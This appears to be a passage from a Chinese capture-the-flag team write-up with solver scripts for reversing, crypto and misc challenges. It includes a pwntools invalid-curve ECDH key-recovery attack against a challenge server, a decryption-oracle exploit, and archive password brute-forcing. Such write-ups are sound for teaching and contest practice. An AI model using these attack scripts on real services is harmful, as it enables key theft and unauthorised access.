    p.irt()

if __name__ == '__main__':
    main()
```

## re

### Parse

flag 括号内的内容之包含三种成分："+", "\_" 和其他字符
两个加密算法，des，aes-128，均采用了 CBC 模式，填充模式为 PKCS5Padding
Sub_70f6 : des
Sub_6e68: aes-128
计算过程类似于算数表达式的倒推，可以把 "\_" 想想为乘法（实际做des），"+" 为加法（做aes）。
这里的 "\_" 满足右结合律，"+" 左结合律。
然后就是判断了，由于"\_" 优先级高于 "+"，所以除非最后 flag 格式为 A_B_C_D_...，此时最后做的为 des 加密；否则最后做的必定是一次 aes 加密。因此我们可以采用上述两种算法对密文进行还原后，看它的 padding 内容来进行判断（这里采用了 PKCS5 Padding，所以最后的补位为对其值）。然后继续递归调用上述过程就可以还原出最中结果了。

### FLw

刚开始 ida7.0 32bit 无法打开，就用 ida64 打开后分析了下程序的基本逻辑，去除了一个 SEH（方法很简单直接改跳转到 handler），然后 patch 了一些混淆内容，就可以正常打开并反编译了。
程序逻辑就是一个vm，所以直接写脚本打印执行日志。最后打印的日志信息如下：

```
the log
0 read input
stack[0] = input_len
1 stack[1] = 28
3 stack[2] = stack[1] - stack[0]
4 stack[2] must be 0
5 stack[3] = input[0]
stack[4] = input[1]
stack[5] = input[2]
stack[6] = input[3]
stack[7] = input[4]
stack[8] = input[5]
stack[9] = input[6]
stack[10] = input[7]
stack[11] = input[8]
stack[12] = input[9]
stack[13] = input[10]
stack[14] = input[11]
stack[15] = input[12]
stack[16] = input[13]
stack[17] = input[14]
stack[18] = input[15]
stack[19] = input[16]
stack[20] = input[17]
stack[21] = input[18]
stack[22] = input[19]
stack[23] = input[20]
stack[24] = input[21]
stack[25] = input[22]
stack[26] = input[23]
stack[27] = input[24]
stack[28] = input[25]
stack[29] = input[26]
stack[30] = input[27]
memset input 0
6 table[25] = stack[3]
8 table[26] = stack[4]
10 table[27] = stack[5]
12 table[28] = stack[6]
14 table[29] = stack[7]
16 table[30] = stack[8]
18 table[31] = stack[9]
20 table[32] = stack[10]
22 table[33] = stack[11]
24 table[34] = stack[12]
26 table[35] = stack[13]
28 table[36] = stack[14]
30 table[37] = stack[15]
32 table[38] = stack[16]
34 table[39] = stack[17]
36 table[40] = stack[18]
38 table[41] = stack[19]
40 table[42] = stack[20]
42 table[43] = stack[21]
44 table[44] = stack[22]
46 table[45] = stack[23]
48 table[46] = stack[24]
50 table[47] = stack[25]
52 table[48] = stack[26]
54 table[49] = stack[27]
56 table[50] = stack[28]
58 table[51] = stack[29]
60 table[52] = stack[30]
62 stack[31] = table[25]
64 stack[32] = 68
66 stack[33] = stack[32] - stack[31]
67 stack[33] must be 0
68 stack[34] = 0
70 table[255] = stack[34]
72 stack[35] = table[26]
74 stack[36] = 101
76 stack[37] = stack[36] - stack[35]
77 stack[37] must be 0
78 stack[38] = 32
80 stack[39] = table[255]
82 stack[40] = table[255]
84 stack[41] = stack[39] + stack[38]
85 stack[42] = stack[41] + stack[40]
86 stack[43] = table[stack[42]]
87 field = (field << 8) + stack[43]
88 stack[44] = 33
90 stack[45] = table[255]
92 stack[46] = table[255]
94 stack[47] = stack[45] + stack[44]
95 stack[48] = stack[47] + stack[46]
96 stack[49] = table[stack[48]]
97 field = (field << 8) + stack[49]
98 stack[50] = 3
100 table[254] = stack[50]
102 stack[51] = table[255]
104 stack[52] = 3
106 stack[53] = stack[52] * stack[51]
107 stack[54] = table[254]
109 stack[55] = 63
111 stack[56] = stack[54] + stack[53]
112 stack[57] = stack[56] + stack[55]
113 stack[58] = field % 58 , field = field / 58
115 table[stack[57]] = stack[58]
116 stack[59] = 1
118 stack[60] = table[254]
120 stack[61] = stack[60] - stack[59]
121 table[254] = stack[61]
123 stack[62] = table[254]
125 if stack[62] != 0: i -= 23
else : i +=2
127 stack[63] = table[255]
129 stack[64] = 1
131 stack[65] = stack[64] + stack[63]
132 table[255] = stack[65]
134 stack[66] = table[255]
136 stack[67] = 10
138 stack[68] = stack[67] - stack[66]
139 if stack[68] != 0: i -= 61
else : i +=2
141 stack[69] = table[29]
143 stack[70] = 84
145 stack[71] = stack[70] - stack[69]
146 stack[71] must be 0
147 stack[72] = table[30]
149 stack[73] = 70
151 stack[74] = stack[73] - stack[72]
152 stack[74] must be 0
153 stack[75] = table[31]
155 stack[76] = 123
157 stack[77] = stack[76] - stack[75]
158 stack[77] must be 0
159 stack[78] = 0
161 table[255] = stack[78]
163 stack[79] = field, field = 0
164 165 stack[80] = table[255]
167 stack[81] = 64
169 stack[82] = stack[81] + stack[80]
170 stack[83] = table[stack[82]]
171 stack[84] = base58[stack[83]]
172 field = (field << 8) + stack[84]
173 stack[85] = table[255]
175 stack[86] = 64
177 stack[87] = stack[86] + stack[85]
178 stack[88] = field, field = 0
179 table[stack[87]] = stack[88]
180 stack[89] = table[255]
182 stack[90] = 1
184 stack[91] = stack[90] + stack[89]
185 table[255] = stack[91]
187 stack[92] = table[255]
189 stack[93] = 30
191 stack[94] = stack[93] - stack[92]
192 if stack[94] != 0: i -= 29
else : i +=2
194 stack[95] = table[28]
196 stack[96] = 67
198 stack[97] = stack[96] - stack[95]
199 stack[97] must be 0
200 stack[98] = table[27]
202 stack[99] = 49
204 stack[100] = stack[99] - stack[98]
205 stack[100] must be 0
206 stack[101] = 0
208 table[255] = stack[101]
210 stack[102] = 0
212 stack[103] = 0
214 field = (field << 8) + stack[102]
215 field = (field << 8) + stack[103]
216 stack[104] = table[255]
218 stack[105] = 64
220 stack[106] = table[255]
222 stack[107] = 65
224 stack[108] = stack[105] + stack[104]
225 stack[109] = stack[107] + stack[106]
226 stack[110] = table[stack[108]]
227 stack[111] = table[stack[109]]
228 stack[112] = stack[111] - stack[110]
229 field = (field << 8) + stack[112]
230 stack[113] = table[255]
232 stack[114] = 65
234 stack[115] = stack[114] + stack[113]
235 stack[116] = field, field = 0
236 table[stack[115]] = stack[116]
237 stack[117] = table[255]
239 stack[118] = 65
241 stack[119] = table[255]
243 stack[120] = 66
245 stack[121] = stack[118] + stack[117]
246 stack[122] = stack[120] + stack[119]
247 stack[123] = table[stack[121]]
248 stack[124] = table[stack[122]]
249 stack[125] = stack[124] + stack[123]
250 field = (field << 8) + stack[125]
251 stack[126] = table[255]
253 stack[127] = 66
255 stack[128] = stack[127] + stack[126]
256 stack[129] = field, field = 0
257 table[stack[128]] = stack[129]
258 stack[130] = table[255]
260 stack[131] = 64
262 stack[132] = table[255]
264 stack[133] = 66
266 stack[134] = stack[131] + stack[130]
267 stack[135] = stack[133] + stack[132]
268 stack[136] = table[stack[134]]
269 stack[137] = table[stack[135]]
270 stack[138] = stack[137] ^ stack[136]
271 field = (field << 8) + stack[138]
272 stack[139] = table[255]
274 stack[140] = 64
276 stack[141] = stack[140] + stack[139]
277 stack[142] = field, field = 0
278 table[stack[141]] = stack[142]
279 stack[143] = table[255]
281 stack[144] = 3
283 stack[145] = stack[144] + stack[143]
284 table[255] = stack[145]
286 stack[146] = table[255]
288 stack[147] = 30
290 stack[148] = stack[147] - stack[146]
291 if stack[148] != 0: i -= 81
else : i +=2
293 stack[149] = table[52]
295 stack[150] = 125
297 stack[151] = stack[150] - stack[149]
298 stack[151] must be 0
299 stack[152] = table[64]
301 stack[153] = 122
303 stack[154] = stack[153] - stack[152]
304 stack[154] must be 0
305 stack[155] = table[65]
307 stack[156] = 25
309 stack[157] = stack[156] - stack[155]
310 stack[157] must be 0
311 stack[158] = table[66]
313 stack[159] = 79
315 stack[160] = stack[159] - stack[158]
316 stack[160] must be 0
317 stack[161] = table[67]
319 stack[162] = 110
321 stack[163] = stack[162] - stack[161]
322 stack[163] must be 0
323 stack[164] = table[68]
325 stack[165] = 14
327 stack[166] = stack[165] - stack[164]
328 stack[166] must be 0
329 stack[167] = table[69]
331 stack[168] = 86
333 stack[169] = stack[168] - stack[167]
334 stack[169] must be 0
335 stack[170] = table[70]
337 stack[171] = 175
339 stack[172] = stack[171] - stack[170]
340 stack[172] must be 0
341 stack[173] = table[71]
343 stack[174] = 31
345 stack[175] = stack[174] - stack[173]
346 stack[175] must be 0
347 stack[176] = table[72]
349 stack[177] = 152
351 stack[178] = stack[177] - stack[176]
352 stack[178] must be 0
353 stack[179] = table[73]
355 stack[180] = 88
357 stack[181] = stack[180] - stack[179]
358 stack[181] must be 0
359 stack[182] = table[74]
361 stack[183] = 14
363 stack[184] = stack[183] - stack[182]
364 stack[184] must be 0
365 stack[185] = table[75]
367 stack[186] = 96
369 stack[187] = stack[186] - stack[185]
370 stack[187] must be 0
371 stack[188] = table[76]
373 stack[189] = 189
375 stack[190] = stack[189] - stack[188]
376 stack[190] must be 0
377 stack[191] = table[77]
379 stack[192] = 66
381 stack[193] = stack[192] - stack[191]
382 stack[193] must be 0
383 stack[194] = table[78]
385 stack[195] = 138
387 stack[196] = stack[195] - stack[194]
388 stack[196] must be 0
389 stack[197] = table[79]
391 stack[198] = 162
393 stack[199] = stack[198] - stack[197]
394 stack[199] must be 0
395 stack[200] = table[80]
397 stack[201] = 32
399 stack[202] = stack[201] - stack[200]
400 stack[202] must be 0
401 stack[203] = table[81]
403 stack[204] = 151
405 stack[205] = stack[204] - stack[203]
406 stack[205] must be 0
407 stack[206] = table[82]
409 stack[207] = 176
411 stack[208] = stack[207] - stack[206]
412 stack[208] must be 0
413 stack[209] = table[83]
415 stack[210] = 61
417 stack[211] = stack[210] - stack[209]
418 stack[211] must be 0
419 stack[212] = table[84]
421 stack[213] = 135
423 stack[214] = stack[213] - stack[212]
424 stack[214] must be 0
425 stack[215] = table[85]
427 stack[216] = 160
429 stack[217] = stack[216] - stack[215]
430 stack[217] must be 0
431 stack[218] = table[86]
433 stack[219] = 34
435 stack[220] = stack[219] - stack[218]
436 stack[220] must be 0
437 stack[221] = table[87]
439 stack[222] = 149
441 stack[223] = stack[222] - stack[221]
442 stack[223] must be 0
443 stack[224] = table[88]
445 stack[225] = 121
447 stack[226] = stack[225] - stack[224]
448 stack[226] must be 0
449 stack[227] = table[89]
451 stack[228] = 249
453 stack[229] = stack[228] - stack[227]
454 stack[229] must be 0
455 stack[230] = table[90]
457 stack[231] = 65
459 stack[232] = stack[231] - stack[230]
460 stack[232] must be 0
461 stack[233] = table[91]
463 stack[234] = 84
465 stack[235] = stack[234] - stack[233]
466 stack[235] must be 0
467 stack[236] = table[92]
469 stack[237] = 12
471 stack[238] = stack[237] - stack[236]
472 stack[238] must be 0
473 stack[239] = table[93]
475 stack[240] = 109
477 stack[241] = stack[240] - stack[239]
478 stack[241] must be 0
```

然后就没什呢好说的了，看算法然后写出逆算法即可

```python
m = [122,25,79,110,14,86,175,31,152,88,14,96,189,66,138,162,32,151,176,61,135,160,34,149,121,249,65,84,12,109]
print len(m)

for i in range(0,30,3):
    byte0 = m[i] ^ m[i+2]
    byte0 &= 0xff
    byte1 = m[i+1] + byte0
    byte1 &= 0xff
    byte2 = m[i+2] - m[i+1]
    byte2 &= 0xff
    m[i] = byte0 & 0xff
    m[i+1] = byte1 & 0xff
    m[i+2] = byte2 & 0xff
ans = ''
for i in range(30):
    ans += chr(m[i])
print ans

base_t = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='
base_t_l = len(base_t)
sum = 0
flag = ''
for i in range(30):
    idx = 0
    for j in range(base_t_l):
        if ans[i] == base_t[j]:
            idx = j
            break
    sum = sum * 58 + idx
    if (i % 3 ==2):
        flag += binascii.a2b_hex(hex(sum)[2:])
        print hex(sum)
        sum = 0
print flag

```

### little elves

写个脚本去除下混淆，并把数据提出来。

去除混淆后的程序逻辑伪代码为：

```python
key_list = [
    [],[],[],.........
]    # 44 * 44
check_list = [ .... ]   #44
flag = 1
for i in range(44):
    key = key_list[i]
    b = 0
    for j in range(44):
        in_b = input[j]
        key_b = key[j]
        for k in range(8):
            if( key_b & 1 ):
                b ^= in_b
            if( in_b & 0x80 ):
                in_b = 2 * in_b ^ 0x39
            else:
                in_b = 2 * in_b
            key_b >>= 1
    if b != check_list[i]:
        flag = 0
```

GF(2^8)矩阵乘法

## crypto

### NLFSR

```python
from z3 import *

def n2b(x):
    a = []
    for i in range(32):
        a.append(x % 2)
        x /= 2
    return a

na, nb, nc, nd = 19, 19, 13, 6
var_a = [Bool("a%d" % i) for i in range(na)]
var_b = [Bool("b%d" % i) for i in range(nb)]
var_c = [Bool("c%d" % i) for i in range(nc)]
var_d = [Bool("d%d" % i) for i in range(nd)]

def build_init(num):
    a = [[0] * num for i in range(32)]
    for i in range(min(32,num)):
        a[i][i] = 1
    return a

now_a = build_init(na)
now_b = build_init(nb)
now_c = build_init(nc)
now_d = build_init(nd)

with open("data") as f:
    data = list(map(int, f.readline().strip()))

ma, mb, mc, md = map(n2b, (0x505a1, 0x40f3f, 0x1f02, 0x31))

def myxor(a, b):
    #assert len(a)==len(b)
    return [a[i] ^ b[i] for i in range(len(a))]

def lfsr(a, m):
    ans = [[] for i in range(32)]
    for i in range(1,32):
        ans[i] = a[i - 1]
    tmp = [0] * len(a[0])
    for i in range(32):
        if m[i] == 1:
            tmp = myxor(tmp, a[i])
    ans[0] = tmp
    return ans

def buildxor(var, a):
    ans = False
    for i in range(len(a)):
        if a[i] == 1:
            ans = Xor(ans, var[i])
    return ans

def combine():
    global now_a, now_b, now_c, now_d, ma, mb, mc, md
    now_a = lfsr(now_a, ma)
    now_b = lfsr(now_b, mb)
    now_c = lfsr(now_c, mc)
    now_d = lfsr(now_d, md)
    a0 = buildxor(var_a, now_a[0])
    b0 = buildxor(var_b, now_b[0])
    c0 = buildxor(var_c, now_c[0])
    d0 = buildxor(var_d, now_d[0])
    return Or(And(a0, b0), And(Not(b0), Xor(c0, d0)))

solve = Solver()
for i in range(min(len(data), 1000)):
    print(i)
    t = combine()
    solve.add(t if data[i]==1 else Not(t))
print(solve)
print(solve.check())
model = solve.model()
print(model)
```

### ECDH

```python
from sage.all import *
from pwn import *
from hashlib import sha256
import random, string
import codecs
from Crypto.Util.number import bytes_to_long

q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd
a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa
b0 = 0x56cbc73d8d2ad00e22f12b930d1d685136357d692fa705dae25c66bee23157b8
field = GF(q)
curve0 = EllipticCurve(field, [a,b0])

primes = []
good_b = []

def find_prime(num):
    global primes
    limit = 100000
    slimit = 100
    while True:
        x = trial_division(num, limit)
        if x == num:
            return 0
        if x > slimit and x not in primes:
            return x
        num /= x
"""
prod_primes = 1
while True:
    b = field.random_element()
    curve = EllipticCurve(field, [a,b])
    num = curve.cardinality()
    p = find_prime(num)
    if p != 0:
        primes.append(p)
        good_b.append(b)
        print(b, p)
        prod_primes *= p
        if prod_primes > q:
            break
print(good_b)
print(primes)
"""

good_b = [6211086815011563067620296699263883972509369396999995302441539455496168622279,
 98574452757002781783654213495931056883939295347317250205181146329494800676987,
 87620687935359399908622892998617361658458401834916224453442868851408379289438,
 65086183749031692453132440274510001138946531322251783223436152949357168702101,
 46021703287063012097535158344315852578288792152338955276762336204655785703272,
 55290385593809045586041069311939346961675411126152634019347481812491795288303,
 87619460816503284587802610883799611592764073598808416496296166011557682550255,
 20587915430822896519925252084987775347053226113504729908243979761922350194076,
 8431127641146869895830619497631705992133861543907167102073129469555247540411,
 72468403213185949431860137197984824137277628176195015746227422957521394676938,
 62477922485214300600210481151431403396481715852508541015009686763485217204376,
 2461097140264877184602960042153986475948757748737511275579273536314357774455,
 52838986369268354399576299386497034405631000959595849861038852829374605724186,
 86449577338760902484545961462235993087119069610730090900228062112247987488276,
 93370252582075567605700397171132502753354843346459110919318579649577858331707,
 33521709848079075367861170558864696456337661027939445036411400565277609897460,
 36751221215551704172177475140942474141885663956592566340914945275246699332067,
 35206252668125338121854612073172440870920181137870760968354503478219656581844,
 30803252885377359748855249043620997912969167347566879519532967182292487052309,
 71723857802697127056254221655374457039601178429445181744952265211749812716407,
 84440413960958962355810939609173041967577265336202346661096261207497914589195,
 99739869036402627989911681764960079998973009086032898863155562454511401401600,
 12803293455235132143163029402376557032938441696712251760407626953815229385756,
 99190990366909263866322135175653748341931762174475579305189953098675271672684,
 17613623221177901583167094460961738253367313920535409663458707894484429207051]
primes = [2179, 1289, 59999, 30259, 113, 2879, 1181, 967, 659, 101, 5449, 227, 271, 23669, 317, 3989, 547, 167, 751, 12457, 983, 269, 457, 1277, 86599]

n = len(good_b)
curves = []
for i in range(n):
    curves.append(EllipticCurve(field, [a, good_b[i]]))

points = [(19507340931189973568970534354346675790660489762463850256460500717283946261836, 93990986852291510741552362898292362153088730070276870172288419312934861060443), (28054202204080435654185626699590118012041849935670790888142479053885296554769, 65263191418667493074958784939105580722524953377895465589805829613231371260761), (19570113117206968931041461825359841635154708132893840274912509868663111066055, 34861736386744152249641750097691296936161875795323328010906578876540223102867), (33388964031225647753658029329629878266463218727954841418700248047371661736053, 90361586139917610370159763883369565805713212527920403273386189235983585562743), (66700790350207354737852013222385488367498981573233379904437853631717043448547, 53433408083666386534739553623370765372323686554370314300461422960727091694924), (36281323235605439303424711969604228819253455717300370339472440863583798921747, 89333075334215107563917563532536759593693082972899271521968161088671976288092), (24898771388008938378671397098037276299001299298558179332046761459119813933208, 60157824174292914357907617012784233148535109635888926712493355114443684410242), (41024842272459113591038406867847701260219120913143525871455120954725085815388, 58080663589581142504473489403185052460849908517621917171065862560693740117488), (44877839753880210170426316074475704017688393591895232633465680932056165426108, 16637391968836021868062256428444034583180361666267818812297923545223531374906), (9213004151061951383151318314265271108777938482780831941654814187659115347886, 11228777849799372233846801614232594742279770274180260153160807304484971904264), (48643305686563148479162697336870778051714568931350429397807207503680876755497, 11195641711169844792310025421834391460453387017937786699885654091495296207043), (1698615000299687838648146942270648895141070165499143965557282372482965747112, 92569310096599508172798587722411817818074417408181334875149071535920735447292), (89935055566882410026353986317893095604898893132013616740671092603082845878572, 43502660097223071441728238468509061422820080712250114528659957352951916779994), (48056015661830589709097512930877649812778054373210479825115615986276908078753, 19618098018003216997623948377351727960824032255044568182472217742720133385651), (93761147474070978486072670079787938982982789958802141020754905539581891787306, 88010231672503149200294157470647905088886902144549803873108630549395091840275), (92020668575688499794016000549051660826892090181832905239230804713279441917958, 30110506624063128411566588628476581431326295832322077660437857357626639718987), (44809345422891960257530727200370127012697279930443588929057473411421246871992, 88545270496688963328321986899568632277665741441711074441024187438963389363897), (13076106146633904709359888905193226187967735552055658529027341002932457572814, 80372346494606386901236287105868984286890847036067050266743919277423665456135), (55907782788450924012146412683706088533171253022693607550089447952215419312846, 3751516562614392695911378044870039330350823342073921223753336327462679673674), (47051129916073582188659668685945994754626518455721110919136386190138499276471, 86704825096586057708845977585742183545462737899909346286882311991113257296140), (81621390336051571271375962201675607332094248443293624702225955356975450394838, 62848412712613880537361968249181467640248592602903157605441011622878154021187), (28068769009810651156082373576237044558982030816550630080563930970321395346474, 19692854947437892925207214399032477726928042246514722730356145177501099769534), (35948452792200094240506018863073321272868570672393239428399789400279043435798, 76267546729736502626578895970729012855904970704453897303449164923661935193761), (40433612828564862678329442593693250130220784327522208224488063346825116554334, 20721954396231306197017431006852550862189546642228084462958643733119955101666), (26739431417888933616685141927426627849471810811576883518571031672580867716174, 43592843242668872950809571417365447079940129342363899108923060420461318436125)]

"""
for i in range(n):
    print("try",i)
    curve = curves[i]
    m = curve.cardinality()
    assert m%primes[i]==0
    if len(points) > i:
        h = curve(points[i][0], points[i][1])
        assert h.order() == primes[i]
        continue
    while True:
        h = curve.random_element()
        h = (m // primes[i]) * h
        if h.order() == primes[i]:
            break
    points.append((h[0], h[1]))
    print(points)
"""

def curve_div(pa,pb):
    ans = 0
    pt = 0*pb
    while pt != pa:
        pt = pt + pb
        ans = ans + 1
    return ans

context.log_level = "debug"
rt = remote("134.175.225.42", 8848)
#rt = remote("localhost", 8848)

def proof():
    line = rt.recvline().decode()
    s0 = line[line.find('+')+1:line.find(')')]
    s1 = line[line.find('==')+3:].strip()
    print(s0,s1,type(s1))
    while True:
        s = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
        if sha256((s+s0).encode()).hexdigest() == s1:
            rt.sendline(s)
            break

proof()
rt.recvuntil("are: \n")
rt.recvline() # q
rt.recvline() # a
rt.recvline() # b
rt.recvline() # P
Q = rt.recvline() # Q
Q = eval(Q[3:])
Q = curve0(Q)
print(Q)

rt.sendline("0")
rt.sendline("0")

divs = []

for i in range(n):
    rt.recvuntil("choice")
    rt.sendline("Exchange")
    rt.recvuntil("X:")
    rt.sendline(str(points[i][0]))
    rt.recvuntil("Y:")
    rt.sendline(str(points[i][1]))
    rt.recvuntil("choice")
    rt.sendline("Encrypt")
    rt.recvuntil("message")
    rt.sendline('ff'*64)
    rt.recvuntil("is:\n")
    result = rt.recvline().strip()
    result = bytes_to_long(codecs.decode(result, 'hex'))
    result ^= (1 << 512) - 1
    x = result >> q.bit_length()
    y = result - (x << q.bit_length())
    curve = curves[i]
    key = curve(x,y)
    h = curve(points[i][0], points[i][1])
    d = curve_div(key, h)
    divs.append(d)

secret = CRT_list(divs, primes)
rt.recvuntil("choice")
rt.sendline("Backdoor")
rt.recvuntil("secret")
rt.sendline(str(secret))
print(rt.recvall())
```

### Homomorphic 

```python
rt.recvuntil("flag is: \n")
enc = []
for i in range(44):
        f1 = eval(rt.recvline())
        f2 = eval(rt.recvline())
        enc.append([f1,f2])

ans = ""
for i in range(44):
        rt.recvuntil("choice")
        rt.sendline("Decrypt")
        c0, c1 = enc[i]
        c0 = (Q(c0) + genError()).list()
        rt.recvuntil("c0")
        rt.sendline(','.join(map(str, c0)))
        rt.recvuntil("c1")
        rt.sendline(','.join(map(str, c1)))
        rt.recvuntil("index")
        rt.sendline('0')
        rt.recvuntil('result is: \n')
        a = rt.recvline()
        ans += chr(int(a))
print(ans)
```

### easyRSA

按照 Extending Wiener’s attack in the presence of many decrypting exponents 的做法 LLL. 论文默认参数出不来, 把 M2 调小到大概 1/4 左右即可:

```
M1 = int(sqrt(N))
M2 = int(limit*0x1000000000001*N^0.998)
```

## misc

### mc_joinin

先用HMCL安装1.12版本的mc

然后找到 .minecraft\versions\1.12\1.12.jar

把里面有关protocl version的地方，都patch成997

然后重新计算hash

imgur.com/a/ZOrErVM

然后LSB 拉一拉 转一转


### mc_champion

多买不同种类的东西，然后exchange 6卖掉，可以赚钱
Congratulation!
Encoded Message:
F5GUGMRQ
GIYC2RCF
IJKUOLKW
JFCVOORN
FEFFC4RR
KBDVG62G
GNYGQZJT
L5EGMTSU
GNPTA4ZN
KRBF6RTZ
OZYHE7T5

base32 然后+-13试一试

### mc_easybgm

```python
a=open('bgm.mp3','rb').read()
a=[ord(i) for i in a]

i=0x28a3
tmp1=''

for _ in range(3285):
    tmp1+=str(a[i+2]%2)
    i+=0x1a1

tmp1 = '0b' + tmp1[::-1]
print hex(int(tmp1,2))[2:-1].decode('hex')
```

### Misc Chowder

考察流量审计、压缩包密码爆破、NTFS流隐藏文件。
审计流量包，发现上传了7张图，wireshark导出`upload_file.php`对象，内容是上传图片时的HTTP包内容，其中包含了`png`的数据，恢复数据拿到图片。
在第七张图中是一个连接地址`https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view`

下载到一个`docx`文件，其中隐写了压缩包，解压需要密码，题目给出Hint：`压缩包密码暴破考点中，密码的长度为6位，前两位为DE`，用`ARCHPR`，掩码模式爆破密码，爆破出压缩包密码`DE34Q1`，解压之后是三个文件。

这个地方考NTFS流隐藏文件，在`666.jpg`文件中关联了另一个文件`fffffffflllll.txt`的内容，命令行下执行`notepad 666.jpg:fffffffflllll.txt`读取其数据流即可拿到flag。

